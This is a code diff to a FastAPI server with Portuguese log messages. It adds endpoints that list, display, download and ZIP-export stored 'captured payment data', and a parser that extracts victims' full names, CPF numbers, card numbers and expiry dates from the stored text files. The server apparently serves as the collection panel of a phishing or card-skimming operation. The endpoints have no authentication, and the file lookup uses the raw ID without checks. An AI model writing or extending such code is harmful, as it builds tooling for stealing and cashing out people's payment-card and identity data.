@@ -418,7 +418,7 @@ async def status():
     """Get API status and configuration"""
     return {
         "status": "running",
-        "port": 6666,
+        "port": 5000,
         "data_directory": str(DATA_DIR),
         "data_directory_exists": DATA_DIR.exists(),
         "email_from": EMAIL_FROM,
@@ -426,6 +426,230 @@ async def status():
         "smtp_server": SMTP_SERVER,
         "smtp_port": SMTP_PORT
     }
+
+@app.get("/api/payments")
+async def get_all_payments():
+    """Get all captured payment data"""
+    try:
+        print(f"\n📥 Listando todos os pagamentos...")
+        payments = []
+
+        # Check if data directory exists
+        if not DATA_DIR.exists():
+            print(f"⚠️  Diretório de dados não existe")
+            return {"success": True, "payments": [], "total": 0}
+
+        # Iterate through all date folders
+        for date_folder in sorted(DATA_DIR.iterdir(), reverse=True):
+            if not date_folder.is_dir():
+                continue
+
+            # Iterate through all payment files in the date folder
+            for file_path in sorted(date_folder.glob("pagamento_*.txt"), reverse=True):
+                try:
+                    # Read file content
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        content = f.read()
+
+                    # Parse the file to extract data
+                    payment_data = parse_payment_file(content, file_path)
+                    if payment_data:
+                        payments.append(payment_data)
+                except Exception as e:
+                    print(f"⚠️  Erro ao ler arquivo {file_path}: {str(e)}")
+                    continue
+
+        print(f"✓ {len(payments)} pagamentos encontrados")
+        return {
+            "success": True,
+            "payments": payments,
+            "total": len(payments)
+        }
+    except Exception as e:
+        print(f"❌ Erro ao listar pagamentos: {str(e)}")
+        import traceback
+        traceback.print_exc()
+        return {
+            "success": False,
+            "error": str(e),
+            "payments": [],
+            "total": 0
+        }
+
+@app.get("/api/payment/{payment_id}")
+async def get_payment_details(payment_id: str):
+    """Get details of a specific payment file"""
+    try:
+        print(f"\n📖 Buscando detalhes do pagamento: {payment_id}")
+
+        # Iterate through all date folders to find the file
+        if not DATA_DIR.exists():
+            return {
+                "success": False,
+                "error": "Arquivo não encontrado"
+            }
+
+        for date_folder in DATA_DIR.iterdir():
+            if not date_folder.is_dir():
+                continue
+
+            file_path = date_folder / f"{payment_id}.txt"
+            if file_path.exists():
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+
+                return {
+                    "success": True,
+                    "id": payment_id,
+                    "content": content
+                }
+
+        return {
+            "success": False,
+            "error": "Arquivo não encontrado"
+        }
+    except Exception as e:
+        print(f"❌ Erro ao buscar pagamento: {str(e)}")
+        return {
+            "success": False,
+            "error": str(e)
+        }
+
+@app.get("/api/payment/{payment_id}/download")
+async def download_payment_file(payment_id: str):
+    """Download a specific payment file as TXT"""
+    try:
+        print(f"\n📥 Baixando arquivo de pagamento: {payment_id}")
+
+        # Iterate through all date folders to find the file
+        if not DATA_DIR.exists():
+            return {
+                "success": False,
+                "error": "Arquivo não encontrado"
+            }
+
+        for date_folder in DATA_DIR.iterdir():
+            if not date_folder.is_dir():
+                continue
+
+            file_path = date_folder / f"{payment_id}.txt"
+            if file_path.exists():
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+
+                from fastapi.responses import FileResponse
+
+                # Return file with proper headers
+                return FileResponse(
+                    file_path,
+                    media_type="text/plain; charset=utf-8",
+                    filename=f"{payment_id}.txt"
+                )
+
+        return {
+            "success": False,
+            "error": "Arquivo não encontrado"
+        }
+    except Exception as e:
+        print(f"❌ Erro ao baixar pagamento: {str(e)}")
+        return {
+            "success": False,
+            "error": str(e)
+        }
+
+@app.get("/api/download-zip")
+async def download_zip():
+    """Download all payment data as a ZIP file"""
+    try:
+        import zipfile
+        import io
+
+        print(f"\n📦 Preparando ZIP com todos os dados...")
+
+        # Create a BytesIO object to store the ZIP file in memory
+        zip_buffer = io.BytesIO()
+
+        # Check if data directory exists
+        if not DATA_DIR.exists():
+            print(f"⚠️  Diretório de dados não existe")
+            return {
+                "success": False,
+                "error": "Nenhum dado disponível para download"
+            }
+
+        # Create ZIP file
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            file_count = 0
+
+            # Iterate through all date folders
+            for date_folder in sorted(DATA_DIR.iterdir()):
+                if not date_folder.is_dir():
+                    continue
+
+                date_str = date_folder.name
+
+                # Iterate through all payment files
+                for file_path in date_folder.glob("pagamento_*.txt"):
+                    try:
+                        # Add file to ZIP with folder structure: date/filename
+                        arcname = f"dados_{date_str}/{file_path.name}"
+                        zip_file.write(file_path, arcname=arcname)
+                        file_count += 1
+                    except Exception as e:
+                        print(f"⚠️  Erro ao adicionar arquivo ao ZIP: {str(e)}")
+                        continue
+
+        print(f"✓ ZIP preparado com {file_count} arquivos")
+
+        # Return the ZIP file
+        zip_buffer.seek(0)
+        from fastapi.responses import StreamingResponse
+
+        return StreamingResponse(
+            iter([zip_buffer.getvalue()]),
+            media_type="application/zip",
+            headers={"Content-Disposition": "attachment; filename=pagamentos.zip"}
+        )
+    except Exception as e:
+        print(f"❌ Erro ao preparar ZIP: {str(e)}")
+        import traceback
+        traceback.print_exc()
+        return {
+            "success": False,
+            "error": str(e)
+        }
+
+def parse_payment_file(content: str, file_path: Path) -> dict:
+    """Parse payment file content and extract data"""
+    try:
+        lines = content.split('\n')
+        data = {
+            'id': file_path.stem,  # Use filename as ID
+            'nomeCompleto': '',
+            'cpf': '',
+            'numeroCartao': '',
+            'validade': '',
+            'dataCriacao': file_path.parent.name,  # Date folder
+            'status': 'processado'
+        }
+
+        # Parse each line
+        for line in lines:
+            if 'Nome Completo:' in line:
+                data['nomeCompleto'] = line.split('Nome Completo:')[1].strip()
+            elif 'CPF:' in line and 'INFORMAÇÕES PESSOAIS' not in line:
+                data['cpf'] = line.split('CPF:')[1].strip()
+            elif 'Número do Cartão:' in line:
+                data['numeroCartao'] = line.split('Número do Cartão:')[1].strip()
+            elif 'Validade:' in line and 'DADOS DO CARTÃO' not in line:
+                data['validade'] = line.split('Validade:')[1].strip()
+            elif 'Data/Hora:' in line and data['dataCriacao'] == file_path.parent.name:
+                data['dataCriacao'] = line.split('Data/Hora:')[1].strip()
+
+        return data if data['nomeCompleto'] else None
+    except Exception as e:
+        print(f"❌ Erro ao fazer parse do arquivo: {str(e)}")
+        return None
 
 if __name__ == "__main__":
     import uvicorn
